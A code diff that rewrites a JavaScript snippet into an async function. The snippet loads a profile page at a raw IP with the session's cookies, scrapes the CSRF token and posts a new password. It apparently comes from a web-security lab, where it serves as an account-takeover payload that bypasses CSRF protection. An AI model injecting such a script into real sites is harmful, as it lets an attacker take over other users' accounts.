@@ -1,26 +1,37 @@
-// Step 1: Fetch profile page and extract CSRF token
-fetch("http://54.74.235.192/profile", { credentials: "include" })
-  .then(res => res.text())
-  .then(html => {
-    let doc = new DOMParser().parseFromString(html, "text/html");
-    let token = doc.querySelector("input[name=_csrf]").value;
+async function updatePassword(newPassword) {
+  // Step 1: Fetch profile page to get CSRF token
+  const res = await fetch("http://3.248.202.69/profile", {
+    credentials: "include" // send cookies (important for session)
+  });
+  const text = await res.text();
 
-    // Step 2: Use the token to send the password update
-    return fetch("http://54.74.235.192/profile", {
-      method: "POST",
-      credentials: "include", // send cookies
-      headers: {
-        "Content-Type": "application/x-www-form-urlencoded"
-      },
-      body: new URLSearchParams({
-        _csrf: token,
-        bio: "Hi, I am Alice!",
-        password: "test"  // <-- new password here
-      })
-    });
-  })
-  .then(res => res.text())
-  .then(resp => {
-    console.log("Response after updating password:", resp);
-  })
-  .catch(err => console.error(err));
+  // Extract CSRF token
+  const match = text.match(/name="_csrf" value="([^"]+)"/);
+  if (!match) {
+    throw new Error("CSRF token not found");
+  }
+  const csrfToken = match[1];
+  console.log("CSRF Token:", csrfToken);
+
+  // Step 2: Send POST request to update password
+  const formData = new URLSearchParams();
+  formData.append("_csrf", csrfToken);
+  formData.append("bio", "Hi, I am Alice!"); // keep existing bio
+  formData.append("password", newPassword);
+
+  const updateRes = await fetch("http://3.248.202.69/profile", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    body: formData.toString(),
+    credentials: "include" // include cookies
+  });
+
+  console.log("Status:", updateRes.status);
+  const updateText = await updateRes.text();
+  console.log("Response:", updateText);
+}
+
+// Example usage:
+updatePassword("test"); // change "test" to your desired password
